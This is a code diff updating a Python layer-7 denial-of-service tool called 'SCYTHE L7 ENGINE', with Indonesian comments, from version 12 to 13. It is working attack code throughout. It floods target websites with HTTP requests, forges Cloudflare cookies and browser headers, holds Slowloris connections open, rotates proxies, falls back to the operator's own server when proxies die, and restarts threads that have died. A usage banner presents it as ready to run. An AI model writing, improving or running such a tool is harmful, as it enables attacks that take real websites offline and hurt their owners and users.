@@ -2,11 +2,12 @@
 # -*- coding: utf-8 -*-
 """
 ╔═══════════════════════════════════════════════════════════════════════════════╗
-║  SCYTHE L7 ENGINE v12.0 — 6 METHODS TERBAIK + PROXY FIX + RETRY            ║
+║  SCYTHE L7 ENGINE v13.0 — DIRECT FALLBACK + SMART RETRY                    ║
 ║  🔥 httpbypass, cf-flood, slow, httpget, httpflood, auto                   ║
-║  🔥 PROXY: support user:pass@host:port, timeout 10s, retry 2x             ║
-║  🔥 DIRECT FALLBACK jika proxy = 0 atau semua mati                         ║
-║  🔥 ERROR LOG: unlimited, biar tau penyebab gagal                          ║
+║  🔥 PROXY: support user:pass@host:port, timeout 10s                        ║
+║  🔥 DIRECT FALLBACK: jika semua proxy mati, pakai IP VPS langsung          ║
+║  🔥 SMART RETRY: hanya retry untuk error sementara                         ║
+║  🔥 ERROR LOG: dibatasi 20 error per detik (tidak banjir)                  ║
 ╚═══════════════════════════════════════════════════════════════════════════════╝
 """
 import sys
@@ -21,8 +22,9 @@ import ssl
 import urllib.parse
 import hashlib
 import base64
+from collections import deque
 
-# ─── Cari proxies.txt di berbagai lokasi ───
+# ─── Cari proxies.txt ───
 def find_proxy_file(filename="proxies.txt"):
     paths = [
         filename,
@@ -35,28 +37,39 @@ def find_proxy_file(filename="proxies.txt"):
             return os.path.abspath(p)
     return None
 
-# ─── Proxy Manager ───
+# ─── Proxy Manager (dengan auto-reload) ───
 class ProxyManager:
     def __init__(self, proxy_file):
         self.proxy_file = proxy_file
         self.proxies = []
         self.lock = threading.Lock()
+        self.last_reload = 0
+        self.reload_interval = 10  # reload setiap 10 detik
         self._load()
 
     def _load(self):
         if not self.proxy_file or not os.path.exists(self.proxy_file):
-            print("[PROXY] No proxy file, using DIRECT connection only", flush=True)
+            self.proxies = []
             return
         try:
             with open(self.proxy_file, "r") as f:
-                self.proxies = [l.strip() for l in f if l.strip() and ":" in l and not l.startswith("#")]
-            print(f"[PROXY] Loaded {len(self.proxies)} proxies", flush=True)
+                new_proxies = [l.strip() for l in f if l.strip() and ":" in l and not l.startswith("#")]
+            with self.lock:
+                self.proxies = new_proxies
+                self.last_reload = time.time()
+            if new_proxies:
+                print(f"[PROXY] Loaded {len(new_proxies)} proxies", flush=True)
         except Exception as e:
             print(f"[PROXY ERROR] {e}", flush=True)
 
     def get(self):
+        # Reload jika perlu
+        if time.time() - self.last_reload > self.reload_interval:
+            self._load()
         with self.lock:
-            return random.choice(self.proxies) if self.proxies else None
+            if not self.proxies:
+                return None
+            return random.choice(self.proxies)
 
     def count(self):
         with self.lock:
@@ -78,6 +91,8 @@ class L7AttackEngine:
         self.end_time = 0
         self.error_count = 0
         self.error_lock = threading.Lock()
+        self.error_log_limit = 20  # max error per detik
+        self.error_log_time = 0
         self._parse_target()
 
     def _parse_target(self):
@@ -131,17 +146,23 @@ class L7AttackEngine:
 
     def _log_error(self, msg):
         with self.error_lock:
-            self.error_count += 1
-            print(f"[ERROR] {msg}", flush=True)
+            now = time.time()
+            if now - self.error_log_time > 1:
+                self.error_log_time = now
+                self.error_count = 0
+            if self.error_count < self.error_log_limit:
+                self.error_count += 1
+                print(f"[ERROR] {msg}", flush=True)
 
-    # ─── CORE SEND REQUEST (dengan retry internal) ───
-    def _send_request(self, proxy=None, method='GET', path=None, body=None, extra_headers=None, retries=2):
-        for attempt in range(retries):
-            sock = None
-            try:
-                path = path or self._path()
-                if proxy:
-                    # Parse proxy: [user:pass@]host:port
+    # ─── CORE SEND REQUEST (dengan DIRECT FALLBACK) ───
+    def _send_request(self, proxy=None, method='GET', path=None, body=None, extra_headers=None, retries=2, allow_direct=True):
+        # Coba dengan proxy jika ada
+        if proxy:
+            for attempt in range(retries):
+                sock = None
+                try:
+                    path = path or self._path()
+                    # Parse proxy
                     proxy_str = proxy
                     if '://' in proxy_str:
                         proxy_str = proxy_str.split('://')[-1]
@@ -165,44 +186,82 @@ class L7AttackEngine:
                         resp = sock.recv(1024)
                         if b'200' not in resp:
                             sock.close()
-                            continue  # retry
+                            continue
                         sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                else:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(10)
-                    sock.connect((self.host, self.port))
-                    if self.scheme == 'https':
-                        sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
+                    else:
+                        # HTTP via proxy (connect langsung)
+                        pass
 
-                headers = self._headers(extra_headers)
-                req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
-                for k, v in headers.items():
-                    req += f"{k}: {v}\r\n"
-                if body:
-                    req += f"Content-Length: {len(body)}\r\n"
-                req += "\r\n"
-                if body:
-                    req += body
+                    headers = self._headers(extra_headers)
+                    req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
+                    for k, v in headers.items():
+                        req += f"{k}: {v}\r\n"
+                    if body:
+                        req += f"Content-Length: {len(body)}\r\n"
+                    req += "\r\n"
+                    if body:
+                        req += body
 
-                sock.sendall(req.encode())
-                # Baca response (tidak wajib, hanya untuk menambah realisme)
-                try:
-                    data = sock.recv(4096)
-                    sock.close()
-                    return True, len(data)
-                except:
-                    sock.close()
-                    return True, 0
+                    sock.sendall(req.encode())
+                    try:
+                        data = sock.recv(4096)
+                        sock.close()
+                        return True, len(data)
+                    except:
+                        sock.close()
+                        return True, 0
 
-            except Exception as e:
-                if sock:
-                    try: sock.close()
-                    except: pass
-                self._log_error(f"_send_request (attempt {attempt+1}): {e}")
-                continue  # retry
-        return False, 0
+                except Exception as e:
+                    if sock:
+                        try: sock.close()
+                        except: pass
+                    # Error sementara, retry
+                    if attempt < retries - 1:
+                        continue
+                    # Jika masih gagal dan allow_direct True, coba direct
+                    if allow_direct:
+                        return self._send_request(proxy=None, method=method, path=path, body=body,
+                                                   extra_headers=extra_headers, retries=1, allow_direct=False)
+                    self._log_error(f"proxy fail: {e}")
+                    return False, 0
 
-    # ─── WORKER UNTUK MASING-MASING METODE ───
+        # ─── DIRECT CONNECTION (tanpa proxy) ───
+        sock = None
+        try:
+            path = path or self._path()
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((self.host, self.port))
+            if self.scheme == 'https':
+                sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
+
+            headers = self._headers(extra_headers)
+            req = f"{method} {path} HTTP/1.1\r\nHost: {self.host}\r\n"
+            for k, v in headers.items():
+                req += f"{k}: {v}\r\n"
+            if body:
+                req += f"Content-Length: {len(body)}\r\n"
+            req += "\r\n"
+            if body:
+                req += body
+
+            sock.sendall(req.encode())
+            try:
+                data = sock.recv(4096)
+                sock.close()
+                return True, len(data)
+            except:
+                sock.close()
+                return True, 0
+
+        except Exception as e:
+            if sock:
+                try: sock.close()
+                except: pass
+            self._log_error(f"direct fail: {e}")
+            return False, 0
+
+    # ─── WORKER ───
     def _httpbypass_worker(self):
         end_time = self.end_time
         local_count = 0
@@ -219,7 +278,7 @@ class L7AttackEngine:
                     extra['Sec-Ch-Ua'] = '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"'
                     extra['Sec-Ch-Ua-Mobile'] = '?0'
                     extra['Sec-Ch-Ua-Platform'] = random.choice(['"Windows"', '"macOS"', '"Linux"'])
-                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra)
+                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
                 if success:
                     local_count += 1
                     local_bytes += bytes_recv
@@ -244,7 +303,7 @@ class L7AttackEngine:
                     'CF-Request-ID': hashlib.md5(str(random.random()).encode()).hexdigest()[:32],
                     'Cookie': f"__cf_bm={random._urandom(16).hex()}; cf_clearance={random._urandom(32).hex()}",
                 }
-                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra)
+                success, bytes_recv = self._send_request(proxy=proxy, extra_headers=extra, retries=2)
                 if success:
                     local_count += 1
                     local_bytes += bytes_recv
@@ -255,13 +314,11 @@ class L7AttackEngine:
             self.total_bytes += local_bytes
 
     def _slow_worker(self):
-        # Slowloris: buka koneksi dan kirim header parsial secara periodik
         end_time = self.end_time
         local_count = 0
         connections = []
         while self.running and time.time() < end_time:
             try:
-                # Buka koneksi baru sampai batas
                 while len(connections) < 100 and self.running and time.time() < end_time:
                     proxy = self.proxy_mgr.get()
                     sock = None
@@ -280,7 +337,6 @@ class L7AttackEngine:
                             sock.connect((self.host, self.port))
                             if self.scheme == 'https':
                                 sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                        # Kirim request awal (tanpa header selesai)
                         sock.sendall(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                         connections.append({'sock': sock, 'last': time.time()})
                         local_count += 1
@@ -290,7 +346,6 @@ class L7AttackEngine:
                             except: pass
                         self._log_error(f"slow connect: {e}")
 
-                # Jaga koneksi tetap hidup dengan mengirim header acak
                 for conn in connections[:]:
                     if time.time() - conn['last'] > random.randint(8, 15):
                         try:
@@ -305,7 +360,6 @@ class L7AttackEngine:
                 time.sleep(0.5)
             except Exception as e:
                 self._log_error(f"slow outer: {e}")
-        # Bersihkan koneksi saat selesai
         for conn in connections:
             try: conn['sock'].close()
             except: pass
@@ -320,7 +374,7 @@ class L7AttackEngine:
             try:
                 proxy = self.proxy_mgr.get()
                 path = self._path()
-                success, bytes_recv = self._send_request(proxy=proxy, path=path)
+                success, bytes_recv = self._send_request(proxy=proxy, path=path, retries=2)
                 if success:
                     local_count += 1
                     local_bytes += bytes_recv
@@ -331,7 +385,6 @@ class L7AttackEngine:
             self.total_bytes += local_bytes
 
     def _httpflood_worker(self):
-        # Keep-alive: buka koneksi dan kirim banyak request per koneksi
         end_time = self.end_time
         local_count = 0
         local_bytes = 0
@@ -339,7 +392,6 @@ class L7AttackEngine:
         max_conns = 50
         while self.running and time.time() < end_time:
             try:
-                # Buka koneksi baru jika kurang
                 while len(connections) < max_conns and self.running:
                     proxy = self.proxy_mgr.get()
                     try:
@@ -357,7 +409,6 @@ class L7AttackEngine:
                             sock.connect((self.host, self.port))
                             if self.scheme == 'https':
                                 sock = self._ssl_ctx().wrap_socket(sock, server_hostname=self.host)
-                        # Kirim request pertama
                         req = f"GET / HTTP/1.1\r\nHost: {self.host}\r\nConnection: keep-alive\r\n\r\n"
                         sock.sendall(req.encode())
                         connections.append({'sock': sock, 'requests': 1})
@@ -365,10 +416,9 @@ class L7AttackEngine:
                     except Exception as e:
                         self._log_error(f"httpflood connect: {e}")
 
-                # Kirim request tambahan pada koneksi yang sudah ada
                 for conn in connections[:]:
                     try:
-                        if conn['requests'] < 100:  # batas request per koneksi
+                        if conn['requests'] < 100:
                             headers = self._headers()
                             path = self._path()
                             req = f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n"
@@ -397,7 +447,6 @@ class L7AttackEngine:
             self.total_bytes += local_bytes
 
     def _auto_worker(self):
-        # Auto switch antara metode setiap 30 detik
         end_time = self.end_time
         local_count = 0
         workers = [self._httpbypass_worker, self._cfflood_worker,
@@ -410,7 +459,6 @@ class L7AttackEngine:
                 if time.time() - last_switch > switch_interval:
                     worker_idx = (worker_idx + 1) % len(workers)
                     last_switch = time.time()
-                # Panggil worker yang aktif
                 workers[worker_idx]()
             except Exception as e:
                 self._log_error(f"auto: {e}")
@@ -439,17 +487,17 @@ class L7AttackEngine:
         self.end_time = self.start_time + self.duration
         proxy_count = self.proxy_mgr.count()
 
-        print(f"\n[Scythe L7 v12.0] {self.method_type.upper()} attack launched", flush=True)
+        print(f"\n[Scythe L7 v13.0] {self.method_type.upper()} attack launched", flush=True)
         print(f"🎯 Target: {self.target}", flush=True)
         print(f"⏱️  Duration: {self.duration}s | Threads: {self.threads} | Proxies: {proxy_count}", flush=True)
+        if proxy_count == 0:
+            print(f"⚠️  No proxies available — using DIRECT connection (your VPS IP)", flush=True)
         print(f"{'='*60}\n", flush=True)
         sys.stdout.flush()
 
-        # Reporter
         reporter = threading.Thread(target=self._rps_reporter, daemon=True)
         reporter.start()
 
-        # Pilih worker
         worker_map = {
             'httpbypass': self._httpbypass_worker,
             'cf-flood': self._cfflood_worker,
@@ -466,8 +514,21 @@ class L7AttackEngine:
             t.start()
             threads.append(t)
 
-        # Tunggu durasi
-        time.sleep(self.duration)
+        # Monitor early death
+        time.sleep(2)
+        alive = sum(1 for t in threads if t.is_alive())
+        if alive == 0:
+            print(f"[WARN] All threads died! Trying direct connection mode...", flush=True)
+            # Force direct mode by emptying proxies
+            with self.proxy_mgr.lock:
+                self.proxy_mgr.proxies = []
+            # Restart threads
+            for _ in range(self.threads):
+                t = threading.Thread(target=worker_func, daemon=True)
+                t.start()
+                threads.append(t)
+
+        time.sleep(max(0, self.duration - 2))
         self.running = False
 
         for t in threads:
@@ -488,11 +549,10 @@ class L7AttackEngine:
 
         return final_total, avg_rps, final_bytes
 
-# ─── STANDALONE ───
 if __name__ == '__main__':
     if len(sys.argv) < 4:
         print("\n" + "="*60)
-        print("🔥 SCYTHE L7 ENGINE v12.0 — 6 METHODS TERBAIK")
+        print("🔥 SCYTHE L7 ENGINE v13.0 — DIRECT FALLBACK")
         print("="*60)
         print("\nUsage:")
         print("  python3 l7_engine.py <method> <target> <duration> [threads] [proxy_file]")
